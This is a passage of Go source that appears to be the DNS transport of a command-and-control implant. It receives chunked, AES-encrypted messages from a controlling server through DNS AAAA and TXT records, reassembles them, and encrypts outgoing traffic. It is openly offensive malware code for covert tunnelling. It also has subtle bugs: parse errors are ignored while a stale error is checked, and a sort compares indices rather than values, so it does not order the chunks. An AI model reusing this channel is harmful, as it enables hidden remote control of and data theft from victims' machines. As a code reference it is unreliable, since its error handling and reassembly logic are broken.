				} else if slices.Contains(receivingStream.StartBytes, binary.LittleEndian.Uint32(ackStartByte[:])) {
					// we've already received this one, continue on
					continue
				} else {
					for j := 4; j < len(ackValues); j++ {
						// now we're actually starting to get data from the response
						packetBytes = append(packetBytes, ackValues[j].(*dns.AAAA).AAAA[:]...)
					}
				}
			} else if c.getRequestType() == dns.TypeTXT {
				ackAgentSessionID = make([]byte, net.IPv4len)
				sessionID, err := strconv.Atoi(ackValues[0].(*dns.TXT).Txt[0])
				if err != nil {
					utils.PrintDebug(fmt.Sprintf("failed to convert sessionID to int: %v\n", err))
					continue
				}
				binary.LittleEndian.PutUint32(ackAgentSessionID, uint32(sessionID))

				ackMessageID = make([]byte, net.IPv4len)
				msgMessageID, _ := strconv.Atoi(ackValues[1].(*dns.TXT).Txt[0])
				if err != nil {
					utils.PrintDebug(fmt.Sprintf("failed to convert msgMessageID to int: %v\n", err))
					continue
				}
				binary.LittleEndian.PutUint32(ackMessageID, uint32(msgMessageID))

				ackStartByte = make([]byte, net.IPv4len)
				msgStartByte, _ := strconv.Atoi(ackValues[2].(*dns.TXT).Txt[0])
				if err != nil {
					utils.PrintDebug(fmt.Sprintf("failed to convert msgStartByte to int: %v\n", err))
					continue
				}
				binary.LittleEndian.PutUint32(ackStartByte, uint32(msgStartByte))

				ackAction = make([]byte, net.IPv4len)
				msgAction, _ := strconv.Atoi(ackValues[3].(*dns.TXT).Txt[0])
				if err != nil {
					utils.PrintDebug(fmt.Sprintf("failed to convert msgAction to int: %v\n", err))
					continue
				}
				binary.LittleEndian.PutUint32(ackAction, uint32(msgAction))

				if binary.LittleEndian.Uint32(ackAgentSessionID[:]) != c.AgentSessionID {
					// somehow we got a message back that's not for our session id, try again
					time.Sleep(100 * time.Millisecond)
					continue
				}
				if binary.LittleEndian.Uint32(ackMessageID[:]) != messageID {
					// somehow we got a message back that's not for our session id, try again
					time.Sleep(100 * time.Millisecond)
					continue
				}
				if binary.LittleEndian.Uint32(ackAction[:]) == uint32(dnsgrpc.Actions_ReTransmit) {
					// something happened and the server is asking to retransmit the message
					utils.PrintDebug(fmt.Sprintf("ReTransmit message: %v\n", messageID))
					receivingStream.StartBytes = make([]uint32, 0)
				} else if binary.LittleEndian.Uint32(ackAction[:]) == uint32(dnsgrpc.Actions_MessageLost) {
					utils.PrintDebug(fmt.Sprintf("Message lost on server: %v\n", messageID))
					return nil
				} else if slices.Contains(receivingStream.StartBytes, binary.LittleEndian.Uint32(ackStartByte[:])) {
					// we've already received this one, continue on
					continue
				} else {
					for j := 4; j < len(ackValues); j++ {
						// now we're actually starting to get data from the response
						answer := ackValues[j].(*dns.TXT).Txt
						msgBytes := ""
						for _, k := range answer {
							msgBytes += k
						}
						decodedBytes, _ := base64.StdEncoding.DecodeString(msgBytes)
						packetBytes = append(packetBytes, decodedBytes...)
					}
				}
			} else {

			}

			receivedPacket := &dnsgrpc.DnsPacket{}
			err = proto.Unmarshal(removeTrailingNulls(packetBytes), receivedPacket)
			if err != nil {
				utils.PrintDebug(fmt.Sprintf("failed to unmarshal received packet: %v\n", err))
				time.Sleep(1 * time.Second)
				c.increaseErrorCount(domain)
				continue
			}

			receivingStream.StartBytes = append(receivingStream.StartBytes, receivedPacket.Begin)
			receivingStream.Size += uint32(len(receivedPacket.Data))
			receivingStream.Messages[receivedPacket.Begin] = receivedPacket
			lastChunk += uint32(len(receivedPacket.Data))
			if receivingStream.Size == receivedPacket.Size {
				utils.PrintDebug(fmt.Sprintf("receive message: Size (%d), Chunks (%d)", receivedPacket.Size, len(receivingStream.StartBytes)))
				totalBuffer := ""
				// sort all the start bytes to be in order
				sort.Slice(receivingStream.StartBytes, func(i, j int) bool { return i < j })
				// iterate over the start bytes and add the corresponding string data together
				for i := 0; i < len(receivingStream.StartBytes); i++ {
					totalBuffer += receivingStream.Messages[receivingStream.StartBytes[i]].Data
				}
				// we got the whole message
				//utils.PrintDebug(fmt.Sprintf("got the whole message: %v\n", totalBuffer))
				return []byte(totalBuffer)
			}
			break
		}
	}
}

func (c *C2DNS) encryptMessage(msg []byte) []byte {
	key, _ := base64.StdEncoding.DecodeString(c.Key)
	return crypto.AesEncrypt(key, msg)
}

func (c *C2DNS) decryptMessage(msg []byte) []byte {
	key, _ := base64.StdEncoding.DecodeString(c.Key)
	return crypto.AesDecrypt(key, msg)
}
